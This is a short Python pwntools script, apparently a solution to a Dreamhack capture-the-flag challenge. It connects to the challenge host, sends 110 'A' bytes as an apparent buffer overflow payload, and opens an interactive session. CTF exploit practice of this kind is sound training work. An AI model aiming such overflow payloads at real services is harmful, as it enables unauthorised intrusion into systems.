from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 11549
r = remote(HOST, PORT)


r.sendline(b'A'*110)
r.interactive()